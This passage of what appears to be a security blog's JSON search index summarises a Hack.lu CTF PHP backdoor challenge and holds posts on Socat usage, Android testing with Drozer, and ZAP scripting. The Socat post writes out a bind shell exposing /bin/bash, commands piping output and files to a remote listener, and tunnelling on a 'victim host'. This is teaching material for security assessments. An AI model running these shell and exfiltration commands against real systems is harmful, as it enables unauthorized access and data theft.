the Hack.lu CTF Tournament.  The code relies heavily on the next() function and the $GLOBALS array:          The next() function advances the internal array pointer by one position.      Combined with the $GLOBALS array, this setup allows for the execution of arbitrary code.        The payload is divided into two parts:          The first part is a PHP function to execute, passed via $_COOKIE['GLOBALS'].      The second part consists of parameters for the function, injected through the file type of a file sent with the same name as the PHP function.        For a more detailed explanation of the solution, you can refer to this write-up:Hack.lu CTF 2014 - Next Global Backdoor Write-UpLink to archived writeup:  Reference"
  },
  
  {
    "title": "Introduction to Socat",
    "url": "/posts/introduction_to_socat/",
    "categories": "network security",
    "tags": "socat",
    "date": "2018-03-22 03:25:52 +0800",
    





    
    "snippet": "Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced featu...",
    "content": "Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced features such as listeners for multiple clients, different protocols, reusing connections, connection redirection etc. The following are some few examples of how to use Socat and how it can be a very useful tool during assessments.Socat ListenerThe following command tells Socat to use the TCP protocol and listen on port 123 and print any given information from a client to the terminal(STDOUT). The TCP value can be changed and specific versions can be used such as TCP4, TCP6, TCP4-LISTEN, and TCP6-LISTEN. The TCP value can also be changed to emulate a UDP listener.socat TCP4-LISTEN:123 STDOUTTo connect to this server, the following command can be issued.socat TCP:192.168.1.81:123 -&gt; helloThis will send the world hello to the socat listener listening on port 123.Something similar to the following can also be issued to take something from STDIN and send that to a listener.whoami | socat STDIN TCP:192.168.1.81:123A useful example of this would be the below where a UDP packet can be created from STDIN and send to a host using socat.echo “UDP packet” | Socat STDIO UDP4-DATAGRAM:192.168.2.1:123Reverse ShellThe below one liner is an example of binding the bash shell to a port and connecting to it.root@kali:~/test# socat TCP-LISTEN:1337 EXEC:/bin/bashSocat web serverTo start a web server with Socat, the following command can be issued. The -v option tells Socat to be verbose and the -T option can be used to set timeouts.socat -v -T0.05 tcp-l:80,reuseaddr,fork system:\"echo 'HTTP/1.1 200 OK'; echo 'Connection: close'; echo; cat\"HTTPS serverSocat can also be used to setup HTTPS servers. In the below example, a self-signed certificate is created using Openssl and it is used to setup a HTTPS server.openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365cat key.pem &gt;&gt; cert.pem socat OPENSSL-LISTEN:443,cert=/root/test/cert.pem -The following command can also be using as an alternative to Openssl client and connect to services using SSL/TLS.socat - OPENSSL:192.168.1.81:443Terminal EmulationIn scenarios where commands need to be issued to a network medium without using a terminal emulator, the following command can be useful.socat READLINE,history:/tmp/serialcommands.txt \\  OPEN:/dev/ttyS0,ispeed=9600,ospeed=9600,crnl,raw,sane,echo=falseRedirecting TrafficIn scenarios where you want to take incoming connections and redirect it to a Linux application, the following command can be used.socat TCP-LISTEN:443,reuseaddr,fork UNIX-CLIENT:/tmp/fooYou can also specify the bind address and specify what IP ranges can connect to this listener. The su=nobody value will ensure that forked processes will run as the nobody low-privileged usersocat TCP-LISTEN:443,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/fooTunnellingSocat can also be a good alternative to SSH when looking for a way to tunnel traffic. The following command can be used on a victim host to capture incoming traffic from port 1022 and send it to 192.168.1.70:22socat TCP4-LISTEN:1022,reuseaddr,fork TCP4:192.168.1.70:22File transferFile transfers can also be conducted with ease using Socat.socat FILE:data.txt TCP:192.168.1.81:1337socat TCP-LISTEN:1337 OPEN:data.txt,creat,truncHowever, since Socat isn’t available by default on most systems, Netcat is a better/easier option during post exploitation phases. The static compiled binary version for Socat can be found here if installation in not possible: https://github.com/andrew-d/static-binaries"
  },
  
  {
    "title": "6 things I didn't know Drozer could do",
    "url": "/posts/six-things-you-didnt-know-Drozer-could-do/",
    "categories": "mobile security",
    "tags": "drozer",
    "date": "2015-10-24 03:25:52 +0800",
    





    
    "snippet": "1 : Intent SniffingIntent sniffing is an attack vector use to capture exposed intents. In certain cases, applications will broadcast intents and will not define any permissions that in need to rece...",
    "content": "1 : Intent SniffingIntent sniffing is an attack vector use to capture exposed intents. In certain cases, applications will broadcast intents and will not define any permissions that in need to receive the intent. This can then be captured by a malicious application. So passing sensitive data via Intents might potentially be dangerous. A popular tool used by most consultants (Link here)[https://www.nccgroup.trust/us/about-us/resources/intent-sniffer/)] called intent sniffer can be used. But it is possible to test for this vulnerability using Drozer.Drozer has a module calledapp.broadcast.sniffwhich can be used to sniff rogue intents. The below example is Drozer capturing all intents sent to battery changed receiver.2 : Finding debuggable applications quicklyIf application is marked as debuggable, then a user can step through code, view variable values, and pause execution of an application. This can be very useful for an attacker since he can try to run arbitrary code under that application permission, hook into certain methods and modify set variables.Drozer has a module calledapp.package.debuggablewhich can be used to find exploitable applications. This simply looks for android:debuggable value in the AndroidManifest.xml but it is a more efficient way of searching for debuggable applications.3 : Finding applications with backup enabledAndroid functionality allows backups and restoration of its data without having root permissions. This feature of android uses ADB backup that allows applications to be backed up to the cloud. This means that if a user replaces or wipes their phone, they can restore app settings. But if an attacker can get physical access to the device and take the backup of the app, he can modify the headers and restore it to the application’s original state.This is a low hanging vulnerability but it is still useful to find in applications. As always, the Drozer module runapp.package.backupcan be used to find applications with backup flag enabled in its manifest file.4 : Capturing Clipboard content with DrozerAll android mobile system has a clipboard which is used by all applications installed on the device. In certain scenarios, applications will store sensitive values such as passwords which can be read and altered by any application. More information about clipboard here: http://developer.android.com/reference/android/content/ClipboardManager.htmlThe drozer module post.capture.clipboard can be used to view clipboard content from any application. It should be noted that the clipboard module will need to be installed in Drozer first.5 : AddJavaScriptInterface Arbitrary Code ExecutionThe Add JavaScript Webview code execution is a vulnerability found in most applications. WebView supports usage of JavaScript which allows execution of remote code through a man in the middle attacker.The Drozer module scanner.misc.checkjavascriptbridge can very useful when trying to identify the vulnerability. By running the commandrun scanner.misc.checkjavascriptbridgeit is possible to identify vulnerable applications6 : Rebuilding Drozer Agent with permissionsBy default, Drozer agent apk only comes with internet access permission. Sometimes you might have to rebuild Drozer agent with certain permissions for various tasks. e.g. Querying permission protected providers, testing custom permissions etc.This can be done in command line by using    Drozer agent build --permission android.permission.[PERMISSION YOU WANT]This is easier than decompiling the app, making edits to the manifest and recompiling again.Bonus : Drozer built in scanning capabilitiesOther useful commands that are worth knowingscanner.provider.injection - Test content providers for SQL injection vulnerabilities.scanner.provider.sqltables - Show all table names accessible through any SQL injection vulnerabilities.scanner.provider.traversal - Test content providers for directory traversal.scanner.misc.readablefiles &amp; writablefiles - Find world-readable files and world-writable files in the given folder. This is easier than browsing each possible directories and using 'ls -la' to see permissions.scanner.provider.finduris - Search for content providers that can be queried."
  },
  
  {
    "title": "ZAP Scripting",
    "url": "/posts/ZAP-Scripting/",
    "categories": "web application security",
    "tags": "zap",
    "date": "2015-08-25 17:25:52 +0800",
    





    
    "snippet": "Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how i...",
    "content": "Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how it can be very useful.ZAP’s scripting feature allows a user to create a script in JavaScript or Zest to further improve ZAP Scanner capabilities. A user can write numerous scripts to work with ZAP’s active scanning, passive scanning, proxy and more. ZAP supports JavaScript and Zest scripts, but it also supports Jython and JRuby via the ZAP Marketplace.I don’t use ZAP a lot but I like the scripting feature due to how quick and easy it is. This can be useful if a user runs into a specific problem during a web application test and needs a quick fix through scripting. E.g. If a user wants the ZAP passive scanner to analyze and report all Base64 encoded data. This can be done by writing a ZAP script and enabling it on the script console.The script console tab itself can be used to write scripts which can be run within ZAP and also has a debug area which also displays error messages. It also provides a basic autocomplete feature which assists with the methods available associated to an object.Lastly, here is a repo of ZAP Scripts written by the community. I’ve written a couple as part of the ZAP Community Scripts Competition. The competition results can be seen here:ZAP Scripting CompetitionTwo of the scripts I wrote can be seen here:  search cvedetails using target server header.js  find base64 strings.jsZAP Community Scripts Repo: Community ScriptsZAP Development Wiki: ZAP Development"
  }
  
]

